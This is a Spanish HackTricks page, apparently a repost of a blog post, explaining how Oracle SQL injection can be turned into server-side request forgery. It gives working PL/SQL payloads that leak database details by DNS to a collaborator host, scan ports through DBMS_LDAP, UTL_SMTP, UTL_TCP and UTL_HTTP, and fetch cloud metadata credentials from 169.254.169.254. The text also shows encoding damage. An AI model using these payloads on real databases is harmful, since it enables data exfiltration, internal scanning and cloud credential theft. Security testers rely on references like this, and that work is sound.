# Inyecci贸n en Oracle

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Sirve esta publicaci贸n como una copia de la m谩quina del tiempo del post eliminado de [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

Usar Oracle para realizar solicitudes HTTP y DNS fuera de banda est谩 bien documentado, pero como un medio para exfiltrar datos SQL en inyecciones. Siempre podemos modificar estas t茅cnicas/funciones para realizar otros SSRF/XSPA.

Instalar Oracle puede ser realmente doloroso, especialmente si deseas configurar una instancia r谩pida para probar comandos. Mi amigo y colega en [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me se帽al贸 a [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) que me permiti贸 configurar una instancia en una m谩quina Ubuntu AWS t2.large y Docker.

Ejecut茅 el comando de docker con la bandera `--network="host"` para poder imitar Oracle como una instalaci贸n nativa con acceso completo a la red, durante el transcurso de esta publicaci贸n de blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Paquetes de Oracle que admiten una especificaci贸n de URL o de Nombre de Host/N煤mero de Puerto <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Para encontrar cualquier paquete y funci贸n que admita una especificaci贸n de host y puerto, realic茅 una b煤squeda en Google en la [Documentaci贸n en l铆nea de la Base de Datos de Oracle](https://docs.oracle.com/database/121/index.html). Espec铆ficamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
La b煤squeda devolvi贸 los siguientes resultados (no todos se pueden utilizar para realizar conexiones de red salientes)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Esta b煤squeda b谩sica obviamente omite paquetes como `DBMS_LDAP` (que permite pasar un nombre de host y un n煤mero de puerto) ya que [la p谩gina de documentaci贸n](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplemente te redirige a una [ubicaci贸n diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Por lo tanto, puede haber otros paquetes de Oracle que se puedan abusar para realizar solicitudes salientes que podr铆an haber sido pasados por alto.

En cualquier caso, echemos un vistazo a algunos de los paquetes que hemos descubierto y enumerado anteriormente.

**DBMS\_LDAP.INIT**

El paquete `DBMS_LDAP` permite acceder a datos de servidores LDAP. La funci贸n `init()` inicializa una sesi贸n con un servidor LDAP y toma un nombre de host y un n煤mero de puerto como argumento.

Esta funci贸n ha sido documentada anteriormente para mostrar la filtraci贸n de datos a trav茅s de DNS, como se muestra a continuaci贸n:
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
Sin embargo, dado que la funci贸n acepta un nombre de host y un n煤mero de puerto como argumentos, tambi茅n puedes usar esto para funcionar como un esc谩ner de puertos.

Aqu铆 tienes algunos ejemplos
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
Un `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` indica que el puerto est谩 cerrado mientras un valor de sesi贸n apunta a que el puerto est谩 abierto.

**UTL\_SMTP**

El paquete `UTL_SMTP` est谩 dise帽ado para enviar correos electr贸nicos a trav茅s de SMTP. El ejemplo proporcionado en el [sitio de documentaci贸n de Oracle muestra c贸mo puedes usar este paquete para enviar un correo electr贸nico](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). Para nosotros, sin embargo, lo interesante es la capacidad de proporcionar un host y una especificaci贸n de puerto.

A continuaci贸n se muestra un ejemplo b谩sico con la funci贸n `UTL_SMTP.OPEN_CONNECTION`, con un tiempo de espera de 2 segundos.
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Un `ORA-29276: tiempo de espera de transferencia` muestra que el puerto est谩 abierto pero no se estableci贸 una conexi贸n SMTP, mientras que un `ORA-29278: error transitorio SMTP: 421 Servicio no disponible` indica que el puerto est谩 cerrado.

**UTL\_TCP**

El paquete `UTL_TCP` y sus procedimientos y funciones permiten [comunicaci贸n basada en TCP/IP con servicios](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Si se programa para un servicio espec铆fico, este paquete puede convertirse f谩cilmente en una forma de acceder a la red o realizar solicitudes completas del lado del servidor, ya que todos los aspectos de una conexi贸n TCP/IP pueden ser controlados.

El ejemplo [en el sitio de documentaci贸n de Oracle muestra c贸mo se puede usar este paquete para hacer una conexi贸n TCP cruda para obtener una p谩gina web](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Podemos simplificarlo un poco m谩s y usarlo para hacer solicitudes a la instancia de metadatos, por ejemplo, o a un servicio TCP/IP arbitrario.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
Interesantemente, debido a la capacidad de crear solicitudes TCP en bruto, este paquete tambi茅n se puede utilizar para consultar el servicio de metadatos de instancia de todos los proveedores de nube, ya que el tipo de m茅todo y los encabezados adicionales se pueden pasar dentro de la solicitud TCP.

**UTL\_HTTP y Solicitudes Web**

Quiz谩s la t茅cnica m谩s com煤n y ampliamente documentada en cada tutorial de Inyecci贸n SQL Oracle Fuera de Banda es el [paquete `UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). Este paquete est谩 definido por la documentaci贸n como - `El paquete UTL_HTTP realiza llamadas de Protocolo de Transferencia de Hipertexto (HTTP) desde SQL y PL/SQL. Puedes usarlo para acceder a datos en Internet a trav茅s de HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
Puedes adem谩s utilizar esto para realizar un escaneo de puertos rudimentario con consultas como:
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Un `ORA-12541: TNS:no listener` o un `TNS:operation timed out` es una se帽al de que el puerto TCP est谩 cerrado, mientras que un `ORA-29263: HTTP protocol error` o datos es una se帽al de que el puerto est谩 abierto.

Otro paquete que he utilizado en el pasado con 茅xito variado es el [m茅todo `GETCLOB()` del tipo abstracto Oracle `HTTPURITYPE`](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) que te permite interactuar con una URL y proporciona soporte para el protocolo HTTP. El m茅todo `GETCLOB()` se utiliza para recuperar la respuesta GET de una URL como un [tipo de dato CLOB.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆gueme** en **Twitter**  [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
